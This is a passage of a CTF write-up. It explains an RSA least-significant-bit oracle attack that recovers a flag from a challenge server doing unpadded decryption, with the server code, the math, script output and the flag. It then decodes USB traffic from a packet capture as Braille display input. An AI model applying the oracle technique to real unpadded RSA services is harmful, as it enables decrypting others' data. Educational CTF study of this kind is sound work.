byte value `M0` with the LSB (least significant bit) equal to 0\n - provide byte value `M1` with the LSB equal to 1\n - provide a ciphertext `C`\n - (the server decrypts `C` into plaintext `P`)\n - count the number of `1` bits returned by the server\n   - majority of `1` bits - the LSB of `P` is probably `1`\n   - majority of `0` bits - the LSB of `P` is probably `0`\n\nWe can understand this interaction as a simple black box that takes an input, the ciphertext `C`, and returns a single bit of information `P0`, the LSB of the decrypted plaintext `P`.\n\nDo note the word \"probably\" in the last step of the interaction. The server only runs 100 trials for each bit we test it for. The more bits we test, the more likely it is that the majority of bits returned by the server do not reflect the LSB of the plaintext!\n\nSo what can we do with our black box? We have been given the ciphertext for the flag (based on the filename), but if we input it into the black box, we can only obtain the LSB of the flag, which is not terribly useful.\n\nNow may be the time to look more closely at the Python script. In particular, the `RsaDecrypt` function used.\n\n    def RsaDecrypt(private_key, ciphertext):\n      assert (len(ciphertext) <=\n              (private_key.public_key().key_size // 8)), 'Ciphertext too large'\n      return pow(\n          int.from_bytes(ciphertext, 'big'),\n          private_key.private_numbers().d,\n          private_key.public_key().public_numbers().n)\n\nThe important thing here is the fact that `RsaDecrypt` is implemented just as a simple exponentiation operation, using the private exponent. It is not checking the input (besides its size in bits), nor is it checking the output. When implemented properly, RSA uses a padding scheme. If the plaintext is not valid with respect to the padding scheme after decryption, it should be rejected (and the client should not know that this happened). Here we can see no such check, so we are dealing with \"plain RSA\", which can be attacked in [numerous ways](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA).\n\nWhat does this mean for us? It means that no matter what ciphertext `C` we give to the server, it will decrypt it and give us (indirectly) the LSB of the resulting plaintext.\n\n**Note**: the rest of this write-up describes how an LSB oracle attack on RSA works, and how it is implemented, as well as some caveats. I am by no means a cryptographer. You might have more luck searching for \"RSA LSB oracle\" and finding a white paper for a proper explanation and proof. Nevertheless, I tried my best to explain it.\n\nBecause RSA is simply exponentiation under some large modulus, there are certain mathematical properties that could be useful to us. In particular, if we multiply two ciphertexts `C1` and `C2`, the resulting plaintext will be the product of the corresponding plaintexts `P1` and `P2`:\n\n    decrypt(C1 * C2) = P1 * P1\n    (C1 * C2)^d = P1 * P2 mod n\n\nWe know the public exponent, so we can choose any plaintext and calculate the corresponding ciphertext. We want to gather information about the flag of course, so one of our ciphertexts (and its plaintext) is chosen. What should we choose for the other ciphertext / plaintext?\n\nLet's step back a bit (ha, ha) and think about our goal. We want to know the flag. We can only gather one bit of information from the server at a time, and it is the LSB of the flag multiplied by any (natural) number we choose. Since we are considering the flag in its binary form, let's consider bitwise shifting as mathematical operations:\n\n         x = 0001 0110 1101\n     2 * x = 0010 1101 1010\n    x << 1 = 0010 1101 1010\n\nA left shift of one bit is the same as multiplying by two.\n\n         x = 0001 0110 1101\n    x // 2 = 0000 1011 0110\n    x >> 1 = 0000 1011 0110\n\nA right shift of one bit is the same as (integer) division by two.\n\nIf we were working in regular integer arithmetic, there would be no way to multiply the flag to reproduce the effect of a right shift. This would mean we multiplied the flag by a number less than 1, but again - we only have natural numbers to work with.\n\nBut we are working in modular arithmetic. If we multiply the flag by some number, the result can be smaller than the original flag! But then again, it could be larger. Can we tell which happened by the LSB?\n\nLet's choose `2` as the number we multiply the flag by:\n\n    Given\n      public modulus    n (n is odd; product of 2 large primes)\n      public exponent   e\n      flag              p (p < n)\n      ciphertext        c  = p^e mod n\n      factor            f  = 2\n      encrypted factor  cf = 2^e mod n\n    Then\n      x = decrypt(c * cf)\n        = (c * cf)^d\n        = (p^e * 2^e)^d\n        = 2p\n    If x < n, then\n      LSB of x mod n is 0! (a left shift)\n    If x ≥ n, then\n      LSB of x mod n is 1! (because n is odd)\n\nSo with this process, we obtained useful information about the flag, in terms of its relative value to `n`, a value which we know!\n\nIn fact, we can repeat this process. If we multiply the flag by `4` (or better, multiply it by `2` twice), what can happen? Since `p < n`, we now have four cases to consider:\n\n      x = decrypt(c * cf)\n        = 4p\n    If      x <  n, then\n      LSB of x mod n is 0! (a left shift of two)\n    If  n ≤ x < 2n, then\n      LSB of x mod n is 1! (because n is odd)\n    If 2n ≤ x < 3n, then\n      LSB of x mod n is 0! (because n is odd and subtracted from `x` twice)\n    If 3n ≤ x     , then\n      LSB of x mod n is 1! (because n is odd and subtracted from `x` thrice)\n\nIf we combine the last two results, we know in which \"quadrant\" of the modulus space `p` is in. That is, if we were to separate the range of all of its possible values, we know in which quarter of this range it lies in.\n\nBut of course, we don't have to stop here. If we keep multiplying our ciphertext by `2^e mod n` (and hence our plaintext by `2`) and gathering the LSB returned by the server, after 1024 interactions, we will know exactly what the flag is. In fact, since the range keeps getting more and more divided, we can spot that our process is that of a binary search, at each point checking a smaller and smaller interval of possible values and deciding on one half of that interval.\n\nWith all the pieces now in place, the implementation is quite easy to understand. We use several parallel connections to gather the LSB / parity bits faster. We consider results where the number of `1` bits is very close to the number of `0` bits to be meaningless and re-try until at least a 60:40 majority is found for any given bit. Once we have gathered all of the needed 1024 bits from the server, we use Python's decimals to have enough precision to calculate the exact value of the flag. (Regular 32 or 64-bit IEEE floats cannot express all possible values when the flag has 1024 bits of information!)\n\n([full Python script](scripts/perfect-secrecy.py))\n\n    $ python3 perfect-secrecy.py\n    calculating ciphertext multiples ...\n    gathering parity bits from server ...\n    calculating flag value ...\n    flag:\n    0x261b4020c33d22e3ae79e4227f2d51c3760e40dcdacd87f025f4c8471ea8cb41d7d8290671730002e6f4f204354467b68336c6c305f5f31375f355f6d335f315f7734355f77306e643372316e365f31665f34663733725f346c6c5f37683335335f79333472355f7930755f645f6c316b335f37305f6d3333377d204f6f2e\n    b\"\\x00\\x02a\\xb4\\x02\\x0c3\\xd2.:\\xe7\\x9eB'\\xf2\\xd5\\x1c7`\\xe4\\r\\xcd\\xac\\xd8\\x7f\\x02_L\\x84q\\xea\\x8c\\xb4\\x1d}\\x82\\x90g\\x170\\x00.oO CTF{h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337} Oo.\"\n\nAnd we got the flag!\n\nWe can see that the message is actually padded using PKCS#1 v1.5. This is signaled by the `\\x00\\x02` prefix to the message, followed by a bunch of random data, then a null byte, and finally the actual message.\n\nDuring the CTF our team was stuck for a little bit despite having the above script implemented and tested locally. The difference was that we did not enforce a 60:40 majority on the bits returned by the server. We got unlucky and one of the bits returned was wrong, giving us this message after deciphering the parity bits:\n\n    $ xxd attempt1.bin\n    0000000: 0002 61b4 020c 321d 86e9 ea88 7ded 44cc  ..a...2.....}.D.\n    0000010: 0ec8 396b 47dd 586b 0b01 29fb 1831 15e3  ..9kG.Xk..)..1..\n    0000020: a367 44e4 9197 7525 880c ec4f 3c91 176a  .gD...u%...O<..j\n    0000030: a2c0 3cd3 6bea 55af b865 7f0b a81c 09af  ..<.k.U..e......\n    0000040: 31ae 192f 69c5 f9eb 7d82 ff6b dac0 d1d4  1../i...}..k....\n    0000050: 5870 49bf f959 c002 ee58 1068 baf1 77ad  XpI..Y...X.h..w.\n    0000060: 51b7 bdc5 fd0f b3b0 f19c 8d97 2ab3 fc29  Q...........*..)\n    0000070: 9a84 6a00 0a59 afdc d9da 0931 be8b 3a68  ..j..Y.....1..:h\n    $ xxd attempt2.bin\n    0000000: 0002 61b4 020c 33d2 2e3a e79e 4227 f2d5  ..a...3..:..B'..\n    0000010: 1c37 60e4 0dcd acd8 7f02 5f4c 8471 ea8c  .7`......._L.q..\n    0000020: b41d 7d82 9067 1730 002e 6f4f 2043 5446  ..}..g.0..oO CTF\n    0000030: 7b68 336c 6c30 5f5f 3137 5f35 5f6d 335f  {h3ll0__17_5_m3_\n    0000040: 315f 7734 355f 7730 6e64 3372 316e 365f  1_w45_w0nd3r1n6_\n    0000050: 3166 5f34 6637 3372 5f34 6c6c 5f37 6833  1f_4f73r_4ll_7h3\n    0000060: 3533 5f79 3334 7235 5f79 3075 5f64 5f6c  53_y34r5_y0u_d_l\n    0000070: 316b 335f 3730 5f6d 3333 377d 204f 6f2e  1k3_70_m337} Oo.\n\nAs you can see, we only got 12 bytes (and a couple of bits) right. I believed the value must have been correct, since the message was valid with respect to the PKSC#1 v1.5 padding scheme. We finally uncovered the problem when I tried to re-encrypt the supposed flag and the result was different from the original ciphertext. Once again, do note the word \"probably\" in the attack description!\n\n`CTF{h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337}`\n\n## 208 Misc / Feel It ##\n\n**Description**\n\n> I have a feeling there is a flag there somewhere\n\n**Files given**\n\n - [a ZIP file](files/feel-it.zip) containing:\n   - `feel-it`\n\n**Solution**\n\nFirst let's identify what our `feel-it` file is:\n\n    $ xxd feel-it.pcap | head\n    0000000: 0a0d 0d0a a000 0000 4d3c 2b1a 0100 0000  ........M<+.....\n    0000010: ffff ffff ffff ffff 0200 3600 496e 7465  ..........6.Inte\n    0000020: 6c28 5229 2043 6f72 6528 544d 2920 6937  l(R) Core(TM) i7\n    0000030: 2d37 3630 3055 2043 5055 2040 2032 2e38  -7600U CPU @ 2.8\n    0000040: 3047 487a 2028 7769 7468 2053 5345 342e  0GHz (with SSE4.\n    0000050: 3229 0000 0300 1f00 4c69 6e75 7820 342e  2)......Linux 4.\n    0000060: 3133 2e32 2d31 2d74 702d 7831 2d63 6172  13.2-1-tp-x1-car\n    0000070: 626f 6e2d 3574 6800 0400 1900 4475 6d70  bon-5th.....Dump\n    0000080: 6361 7020 2857 6972 6573 6861 726b 2920  cap (Wireshark) \n    0000090: 322e 342e 3200 0000 0000 0000 a000 0000  2.4.2...........\n\nWe can see the strings \"Dumpcap\" and \"Wireshark\". So we have a packet capture file, and we can use (surprisingly) Wireshark to analyse it.\n\n![](screens/feel-it1.png)\n\nWe can see many packets Wireshark identified as \"USB\" and \"USBHID\". So we are not dealing with network traffic, but some sort of peripheral device connected to a computer. First we should try to identify what device it is. Among the first packets we can see some that are `GET DESCRIPTOR Response STRING`.\n\n    (packet 12) Manufacturer is confidential\n    (packet 10) and so is product string\n    (packet 14) not to mention serial number\n\nThis is not terribly useful and clearly some information is hidden from us. Hopefully we can still identify what device it is simply by looking at the data that is being transmitted. If we skim through the packets, we can see a couple that are `SET_REPORT Request` and seem to carry 64 bytes of data in a field called \"data fragment\". The data carried over these packets seems to grow larger and larger (i.e. less null bytes, more non-null bytes) as time goes on. We can use `tshark` to extract all the data fragments from the packet capture:\n\n    $ tshark -F pcap -Tfields -e usb.data_fragment -r feel-it.pcap | grep -v \"^$\"\n02:00:04:53:49:03:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55\n02:00:54:42:53:1d:15:1e:00:01:1d:00:41:5e:24:4e:4f:4a:06:00:1e:11:2d:1e:00:3a:0a:19:1b:11:1e:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    ... etc etc\n\n(`grep -v \"^$\"` was used to filter out empty lines, representing packets that do not have a USB data fragment.)\n\nMany of the packets seem identical, however. Let's focus on the ones that actually carry data:\n\n    $ tshark -F pcap -Tfields -e usb.data_fragment -r feel-it.pcap | grep \"02:00:54:42:53\"\n    02:00:54:42:53:1d:15:1e:00:01:1d:00:41:5e:24:4e:4f:4a:06:00:1e:11:2d:1e:00:3a:0a:19:1b:11:1e:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:43:57:47:5e:5e:7d:00:22:28:16:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:2a:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:ea:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:cb:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:de:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:c9:5e:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:c9:5e:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:de:4b:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:cb:2a:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:ea:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:11:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:19:d1:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:2e:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:d9:11:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:d1:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:3c:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:05:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:00:49:5e:4b:2a:13:02:19:11:38:01:1d:19:38:0e:12:12:05:3b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n    02:00:54:42:53:1d:15:1e:00:01:1d:00:41:5e:24:4e:4f:4a:06:00:1e:11:2d:1e:00:3a:0a:19:1b:11:1e:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n\n([file with the extracted data](scripts/feel-it/data.txt))\n\nThis may not be obvious, but the data looks very much like somebody is typing characters into a terminal. The `00` bytes represent the empty space after the command. `c0` is present at the end of most lines, it is probably a cursor character. In general, the line is growing one character at a time. And another strong clue - whenever `c0` is NOT present at the end of the line, we can tell that the cursor is moving back across the already typed text. It is setting the the 2 highest bits of whichever value it is currently hovering over, then when more characters appear, the cursor moves with the rest of the line towards the right.\n\nSo great, this is somebody typing into a terminal. But what? The data is not in ASCII. We can make some additional observations. Here is a fragment of the data, highlighting the end of the command line, and omitting `00` bytes for clarity.\n\n    38:01:1d:19:38:0e:c0\n    38:01:1d:19:38:0e:3c:c0\n    38:01:1d:19:38:0e:3c:3c:c0\n    38:01:1d:19:38:0e:3c:c0\n    38:01:1d:19:38:0e:c0\n    38:01:1d:19:38:0e:12:c0\n    38:01:1d:19:38:0e:12:12:c0\n    38:01:1d:19:38:0e:12:12:05:c0\n    38:01:1d:19:38:0e:12:12:05:3b:c0\n\nWhat happened here?\n\nThe character `3c` was entered twice. Then it was deleted, and replaced with two `12` bytes. The user was typing a word with a doubled letter, then replaced it with a different doubled letter. Perhaps fat fingers, something like:\n\n    some text some text some text sw_\n    some text some text some text swr_\n    some text some text some text swrr_\n    some text some text some text swr_\n    some text some text some text sw_\n    some text some text some text swe_\n    some text some text some text swee_\n    some text some text some text sweet_\n\nWhatever it was, we now have pretty solid evidence that we are dealing with an encoding / encryption that encodes single characters only, independent of their position on the line, or the packet they occur in, or the current time, etc. Something like a monoalphabetic substitution cipher. (Caesar's? Single-byte XOR? Affine?)\n\nHowever, try as we might, our team could not decrypt these characters. We had the data being entered input for more than 24 hours without making much sense of it. On the morning of the second day I had some time to think:\n\n - a peripheral device showing a command line\n - all of the data is contained within the low 7 bits, except the cursor that uses the highest bit\n - when the cursor moves over a character, it sets the 7th bit no matter what its value was originally\n\nThis made me think of [7-segment LCD displays](https://en.wikipedia.org/wiki/Seven-segment_display). In particular, the seventh bit would represent the lowest segment of the character. Then the cursor would simply be an underscore-like character. Moving over a character would underline it if possible. I thought the eighth bit could be the decimal point that's not really a part of the character - then the user could always tell which character was selected.\n\nReturning to the data example above, it would look something like:\n\n     -    -    -    -    -\n    |    | |    |  |    | |\n     -              -    -\n    |    | |    |  |    | |\n     -              -         -\n    ----------------------------------\n     -    -    -    -    -    -\n    |    | |    |  |    | |  |\n     -              -    -    -\n    |    | |    |  |    | |  |\n     -              -         -    -\n    ----------------------------------\n     -    -    -    -    -    -    -\n    |    | |    |  |    | |  |    |\n     -              -    -    -    -\n    |    | |    |  |    | |  |    |\n     -              -         -    -    -\n    etc\n\nBut applying the standard orderings of the segments as shown on Wikipedia didn't produce anything meaningful. Perhaps we simply need to find the correct bit-to-segment mapping? The challenge description did not mention that the flag would be in non-standard format. Hence we have to be able to find `CTF{...}` in the data somehow. We could represent `ctf` like this:\n\n               -\n         |    |\n     -    -    -\n    |    |    |\n     -    -\n\nWhile we do not know the exact mapping of bits, we know how many bits should be `1`. In the above, we are looking for a sequence like `3, 4, 4` in the data. Additionally, the `t` has all the bits of `c` plus one more. The `f` has three bits of `t`, but not the one from `c`, and then one additional bit.\n\nThere are other ways to display `CTF`, e.g. with a capital C. No matter how we searched the bits of the data, however, we could not find a suitable pattern.\n\nWe spent quite a bit more thinking 7-segment display is still the answer, somehow.\n\nBut at some point it hit me: the challenge is called \"Feel it\". Sometimes there are red herrings in challenge descriptions, but this would be a huge one. The description of the challenge needs to be considered a part of the challenge in a good CTF, subtly but clearly (once understood) guiding the players towards the correct solution.\n\nSo far we have not used the description. What can you feel? What kind of display relies not on the sense of sight, but the sense of touch? It is a Braille display! Almost immediately this seemed like an excellent fit for the data. Another characteristic of the data (also true for the 7-segment display idea) was that the lack of characters, i.e. spaces and the empty space after the line, was represented with `00` bytes. To represent a space in Braille you simply put no dots, i.e. empty space. So a `00` byte make sense as a space character in Braille.\n\nBut we still had the same problem: how to map the bits to the dots of Braille characters? Why do some characters use 7 bits, despite Braille technically being a 6-bit encoding? Trying to find `CTF` in the beginning of the \"command line\" did not really help, since the number of bits did not really agree with what `CTF` is in Braille. We can, however, apply the same method as before - look for a pattern in the number of dots. In fact, since 7 bits were being used, we performed a lenient search - look for patterns that have *at least* as many bits set as it would take to represent `CTF`.\n\nHere is what `CTF` is like in Braille:\n\n    oo   o  oo\n        oo  o\n        o   \n    C   T   F\n\n2 bits, 4 bits, 3 bits. Converting the data fragment bytes to binary (only keeping the lowest 7 bits), there are multiple places where this pattern could fit:\n\n([full pattern finder script](scripts/feel-it/PatternFind.hx))\n\n    $ haxe --run PatternFind\n    02: [0,0,0,0,0,1,0]: 1\n    00: [0,0,0,0,0,0,0]: 0\n    54: [1,0,1,0,1,0,0]: 3\n    42: [1,0,0,0,0,1,0]: 2 MATCH\n    53: [1,0,1,0,0,1,1]: 4 MATCH\n    6A: [1,1,0,1,0,1,0]: 4\n    07: [0,0,0,0,1,1,1]: 3\n    11: [0,0,1,0,0,0,1]: 2\n    1B: [0,0,1,1,0,1,1]: 4\n    0A: [0,0,0,1,0,1,0]: 2\n    1E: [0,0,1,1,1,1,0]: 4\n    48: [1,0,0,1,0,0,0]: 2\n    0E: [0,0,0,1,1,1,0]: 3\n    13: [0,0,1,0,0,1,1]: 3\n    11: [0,0,1,0,0,0,1]: 2\n    07: [0,0,0,0,1,1,1]: 3\n    07: [0,0,0,0,1,1,1]: 3\n    00: [0,0,0,0,0,0,0]: 0\n    18: [0,0,1,1,0,0,0]: 2 MATCH\n    7B: [1,1,1,1,0,1,1]: 6\n    2B: [0,1,0,1,0,1,1]: 4\n    00: [0,0,0,0,0,0,0]: 0\n    49: [1,0,0,1,0,0,1]: 3 MATCH\n    5E: [1,0,1,1,1,1,0]: 5 MATCH\n    4B: [1,0,0,1,0,1,1]: 4\n    2A: [0,1,0,1,0,1,0]: 3\n    13: [0,0,1,0,0,1,1]: 3\n    02: [0,0,0,0,0,1,0]: 1\n    19: [0,0,1,1,0,0,1]: 3\n    11: [0,0,1,0,0,0,1]: 2\n    38: 